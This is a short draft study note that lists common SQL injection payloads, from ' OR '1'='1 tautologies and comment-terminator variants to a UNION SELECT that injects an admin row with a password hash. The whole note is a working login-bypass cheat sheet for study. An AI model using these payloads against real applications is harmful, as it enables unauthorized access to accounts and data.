---
title: SQL Injection Techniques
aliases: []
tags:
- study-notes
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: sqlinjection-quickcheck.md
related_tools: []
related_techniques: []
related_tactics: []
related_services: []
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# SQL Injection Techniques

## SQL Injection Techniques
The following are common SQL injection techniques used to exploit vulnerabilities in web applications:

- `or 1=1`: This technique is used to bypass authentication or filter conditions. For example, `admin' or 1=1`.

- `--`: This is a comment operator in SQL, which can be used to terminate the query. For example, `admin' --`.

- `#`: This is another comment operator in SQL, similar to `--`. For example, `admin'#`.

- `/* ... */`: This is a multi-line comment operator in SQL. For example, `admin'/* 1=1 */`.

- `' OR '1'='1`: This technique is used to force the query to always return true. For example, `admin' OR '1'='1`.

- `' OR '1'='1'--`: This technique combines the `OR` condition with the `--` comment operator. For example, `admin' OR '1'='1'--`.

- `' OR '1'='1'#`: This technique combines the `OR` condition with the `#` comment operator. For example, `admin' OR '1'='1'#`.

- `' OR '1'='1'/*`: This technique combines the `OR` condition with the `/*` comment operator. For example, `admin' OR '1'='1'/*`.

- `' OR '1'='1' AND '1'='1`: This technique is used to force the query to always return true. For example, `admin' OR '1'='1' AND '1'='1`.

- `' OR '1'='1' AND '1'='1'--`: This technique combines the `OR` condition with the `--` comment operator. For example, `admin' OR '1'='1' AND '1'='1'--`.

- `' OR '1'='1' AND '1'='1'#`: This technique combines the `OR` condition with the `#` comment operator. For example, `admin' OR '1'='1' AND '1'='1'#`.

- `' OR '1'='1' AND '1'='1'/*`: This technique combines the `OR` condition with the `/*` comment operator. For example, `admin' OR '1'='1' AND '1'='1'/*`.

- `1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055`: This technique is used to extract data from the database. For example, `1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055`.

